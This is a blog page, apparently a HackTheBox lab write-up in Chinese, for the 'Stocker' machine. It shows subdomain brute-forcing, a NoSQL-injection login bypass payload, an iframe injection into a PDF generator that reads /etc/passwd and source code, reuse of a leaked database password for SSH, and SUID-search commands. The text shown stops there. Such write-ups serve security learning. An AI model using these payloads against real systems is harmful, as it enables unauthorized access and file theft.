@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Stocker - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Stocker - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/Stocker/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T10:34:06.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/HackTheBox/">HackTheBox</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Stocker</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p> <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676642343810-cefbd08e-98db-4a3c-a831-35db9b55deb7.png#averageHue=%23191e28&clientId=uf351d4f8-f9fd-4&from=paste&height=618&id=u87fa3a6d&name=image.png&originHeight=772&originWidth=1823&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193516&status=done&style=none&taskId=ufa85af95-0d5e-41f6-8483-856a78bc36b&title=&width=1458.4" alt="image.png"></p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>HTML转PDF时的SSRF，任意文件读取</li>
+<li>sudo node 提权</li>
+<li>子域名爆破</li>
+<li>NOSQL注入</li>
+</ul>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>nmap -sS -sC -sV -Pn 10.10.11.196</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for stocker.htb (10.10.11.196)</span><br><span class="line">Host is up (0.65s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)</span><br><span class="line">|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)</span><br><span class="line">|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Stock - Coming Soon!</span><br><span class="line">|_http-generator: Eleventy v2.0.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>开的服务比较少，就一个80和22，访问80站点：<br><code>echo 10.10.11.196 stocker.htb &gt;&gt; /etc/hosts</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645173412-b497659f-df5d-44c5-890c-909e1c443ac2.png#averageHue=%23d3d4ce&clientId=u80746843-6f20-4&from=paste&height=630&id=u516f581b&name=image.png&originHeight=788&originWidth=1678&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=355392&status=done&style=none&taskId=u0bb86ab8-6416-48f5-a6aa-5db41f7de4b&title=&width=1342.4" alt="image.png"><br>扫描目录也没发现可疑点，因此尝试爆破子域名:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/boogipop/gobuster-master]</span><br><span class="line">└─# gobuster vhost -u http://stocker.htb/ -w SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50  --append-domain </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.4</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://stocker.htb/</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         50</span><br><span class="line">[+] Wordlist:        SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.4</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">2023/02/17 22:46:54 Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这边gobuster后面必须加上<code>--append-domain</code>，这个参数的意思是在给出的domain前面再加一级domain，去掉这个选项你的字典就需要是完整的域名<br>发现了<code>dev.stocker.htb</code>,<code>echo 10.10.11.196 dev.stocker.htb &gt;&gt;/etc/hosts</code><br>添加进hosts文件后访问网站：</p>
+<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><p>一般碰到一个登录框，首先思路就有3种，sql注入,nosql注入,爆破，经过尝试sql注入和爆破都未果，并且也尝试过nosql，但是一直失败<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645516175-4c19c6e2-afd2-4e2a-adfe-42637089e86d.png#averageHue=%23f4f4f4&clientId=u80746843-6f20-4&from=paste&height=703&id=uacea59f1&name=image.png&originHeight=879&originWidth=1703&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45741&status=done&style=none&taskId=u3fc51548-1d3e-4a53-9f94-0ed9e51e6ca&title=&width=1362.4" alt="image.png"><br>没思路的时候想起来nodejs好像和json格式有点渊源，nodejs是可以接受req的json数据的，所以我就思考是不是格式给错了，尝试payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: dev.stocker.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">Origin: http://dev.stocker.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://dev.stocker.htb/login</span><br><span class="line"></span><br><span class="line">Cookie: connect.sid=s%3AC_14zHiq1gQ4WJLR29rNJBygb8UiC9sC.0xT4YzK5wQgFb0xURb4GuhUvcl1G7HEtqC%2FxazxOkVU</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645675300-934818ed-cebd-497b-9ced-ad5ad3a9d39c.png#averageHue=%23faf1eb&clientId=u80746843-6f20-4&from=paste&height=316&id=u1531b447&name=image.png&originHeight=395&originWidth=1115&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=82424&status=done&style=none&taskId=u534b7e42-cb4b-436b-93a8-d435fb7c9ab&title=&width=892" alt="image.png"><br>登录成功，进入页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645700310-7adba744-ee33-4122-836e-53e4c14d5909.png#averageHue=%23919c70&clientId=u80746843-6f20-4&from=paste&height=735&id=u2bd978f3&name=image.png&originHeight=919&originWidth=1760&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=341360&status=done&style=none&taskId=u998cee66-b092-4547-92b5-efd83749a50&title=&width=1408" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645714625-d6d57c47-9074-40e6-a564-b6b8e1066f3a.png#averageHue=%23d6c1b5&clientId=u80746843-6f20-4&from=paste&height=479&id=u1e19ede3&name=image.png&originHeight=599&originWidth=1600&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35736&status=done&style=none&taskId=u46d84a1f-ec5b-43f8-ad01-726bdf70f61&title=&width=1280" alt="image.png"><br>是一个购物界面，你购买之后他会返回一个PDF清单：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645799593-413bfe8f-ad07-475b-81e6-47898a056209.png#averageHue=%23d0d2d0&clientId=u80746843-6f20-4&from=paste&height=594&id=u4f9c74cb&name=image.png&originHeight=742&originWidth=1621&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80034&status=done&style=none&taskId=u265b5f7c-5332-4d9c-8b44-7ac3ba7c181&title=&width=1296.8" alt="image.png"></p>
+<h1 id="PDF导致的SSRF"><a href="#PDF导致的SSRF" class="headerlink" title="PDF导致的SSRF"></a>PDF导致的SSRF</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676645914685-b69188bb-63ca-45e8-b4df-ce17b794bb5c.png#averageHue=%23fcfbfb&clientId=u80746843-6f20-4&from=paste&height=387&id=u4a5e2441&name=image.png&originHeight=484&originWidth=1085&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69490&status=done&style=none&taskId=uc13dcc68-d785-4be3-817c-025c99fe1c8&title=&width=868" alt="image.png"><br>在购买界面我们可以控制title的内容，也就控制了PDF文件标题内容，我们可以尝试嵌入HTML代码：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/order</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-awk">Host: dev.stocker.htb</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">User-Agent: Mozilla<span class="regexp">/5.0 (X11; Linux x86_64; rv:102.0) Gecko/</span><span class="number">20100101</span> Firefox/<span class="number">102.0</span></span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Accept: */*</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Accept-Language: en-US,en;q=<span class="number">0.5</span></span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Referer: http:<span class="regexp">//</span>dev.stocker.htb/stock</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Content-Type: application/json</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Origin: http:<span class="regexp">//</span>dev.stocker.htb</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Content-Length: <span class="number">156</span></span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Connection: close</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">Cookie: connect.sid=s%<span class="number">3</span>AC_14zHiq1gQ4WJLR29rNJBygb8UiC9sC.<span class="number">0</span>xT4YzK5wQgFb0xURb4GuhUvcl1G7HEtqC%<span class="number">2</span>FxazxOkVU</span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk"></span></span><br><span class="line"><span class="language-awk">&#123;<span class="string">&quot;basket&quot;</span>:[&#123;<span class="string">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a91&quot;</span>,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe src=file:///etc/passwd width=1000px height=1000px&gt;&lt;/iframe&gt;&quot;</span>,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s an axe.&quot;</span>,<span class="string">&quot;image&quot;</span>:<span class="string">&quot;axe.jpg&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">12</span>,<span class="string">&quot;currentStock&quot;</span>:<span class="number">21</span>,<span class="string">&quot;__v&quot;</span>:<span class="number">0</span>,<span class="string">&quot;amount&quot;</span>:<span class="number">1</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646127542-42ef1ea4-053e-4acc-842a-12ec030cabb1.png#averageHue=%23fbfafa&clientId=u80746843-6f20-4&from=paste&height=420&id=u89f6318b&name=image.png&originHeight=525&originWidth=1161&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83971&status=done&style=none&taskId=u92faec22-b070-4fab-b244-7eafc101c47&title=&width=928.8" alt="image.png"><br>返回了orderid，我们访问pdf文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646163315-6c803641-8666-4c7b-9b6a-b37edbc8eb66.png#averageHue=%23a6d35d&clientId=u80746843-6f20-4&from=paste&height=651&id=ucaff4163&name=image.png&originHeight=814&originWidth=1352&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152549&status=done&style=none&taskId=u5c228d68-6ca0-4e57-a509-c32086af737&title=&width=1081.6" alt="image.png"><br>成功SSRF出了passwd文件，这里注意我们的userid<code>angoose</code>，这应该就是普通用户的名字，接着我们可以尝试读取网站源代码，这个网站是用express框架搭建的，并且域名为<code>dev</code>，因此可以猜到为<code>/var/www/dev/index.js</code>(这里有点牵强)<br>但是我们也可以通过报错信息得出目录位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646322065-5a142cc7-ba33-4f78-8a27-52d9d2df4eaf.png#averageHue=%23f9f9f9&clientId=u80746843-6f20-4&from=paste&height=454&id=u082cb89c&name=image.png&originHeight=568&originWidth=1259&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133031&status=done&style=none&taskId=ua23792f1-cd5b-4a6a-bbca-52102cb1aa0&title=&width=1007.2" alt="image.png"><br>报错信息中就可发现目录<code>/var/www/dev</code>，因此尝试读取<code>/var/www/dev/index.js</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646661330-16bff43b-84c3-4b3c-9bc9-ba23b2bf59fc.png#averageHue=%23faf9f9&clientId=u80746843-6f20-4&from=paste&height=515&id=ucf6cd1d7&name=image.png&originHeight=644&originWidth=1296&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105812&status=done&style=none&taskId=u69e7afc4-6703-4508-9073-ac1d53d5adb&title=&width=1036.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646631526-d103e8dd-6220-443e-84a6-3aab9cbeb470.png#averageHue=%23aaaaac&clientId=u80746843-6f20-4&from=paste&height=548&id=u5960e61d&name=image.png&originHeight=685&originWidth=1593&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106812&status=done&style=none&taskId=u87212147-85e0-4730-8e31-6584ea4a161&title=&width=1274.4" alt="image.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MongoStore</span> = <span class="built_in">require</span>(<span class="string">&quot;connect-mongo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; generatePDF, formatHTML &#125; = <span class="built_in">require</span>(<span class="string">&quot;./pdf.js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes, createHash &#125; = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Configure loading from dotenv for production</span></span><br><span class="line"><span class="keyword">const</span> dbURI = <span class="string">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;</span>;</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line"><span class="title function_">session</span>(&#123;</span><br><span class="line"><span class="attr">secret</span>: <span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line"><span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">store</span>: <span class="title class_">MongoStore</span>.<span class="title function_">create</span>(&#123;</span><br><span class="line"><span class="attr">mongoUrl</span>: dbURI,</span><br><span class="line">&#125;),</span><br><span class="line">&#125;)</span><br><span class="line">);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/static&quot;</span>, express.<span class="title function_">static</span>(__dirname + <span class="string">&quot;/assets&quot;</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/products&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) <span class="keyword">return</span> res.<span class="title function_">json</span>([]);</span><br><span class="line"><span class="keyword">const</span> products = <span class="keyword">await</span> mongoose.<span class="title function_">model</span>(<span class="string">&quot;Product&quot;</span>).<span class="title function_">find</span>();</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(products);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/templates/login.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"><span class="keyword">if</span> (!username || !password) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Implement hashing</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="keyword">await</span> mongoose.<span class="title function_">model</span>(<span class="string">&quot;User&quot;</span>).<span class="title function_">findOne</span>(&#123; username, password &#125;);</span><br><span class="line"><span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = user.<span class="property">id</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/order&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;&#125;);</span><br></pre></td></tr></table></figure>
+<p>发现了Mongodb的链接URL，其中有一串可疑密码<code>IHeardPassphrasesArePrettySecure</code>，这大概率就是用户angoose的密码</p>
+<h1 id="sudo-Node提权"><a href="#sudo-Node提权" class="headerlink" title="sudo Node提权"></a>sudo Node提权</h1><p>这边拿到用户名密码<code>angoose/IHeardPassphrasesArePrettySecure</code>，ssh连接，在用户目录拿到user.txt:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676646956941-84a8fb96-89fd-4345-b457-868e6b81f24d.png#averageHue=%2323252d&clientId=u878aad36-f4b0-4&from=paste&height=118&id=u0d3e6c16&name=image.png&originHeight=147&originWidth=588&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30613&status=done&style=none&taskId=u3aed06d5-2e93-4cc5-b194-b6c7ba7e7c5&title=&width=470.4" alt="image.png"><br>现在就是该思考怎么提权，首先找一下SUID权限：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
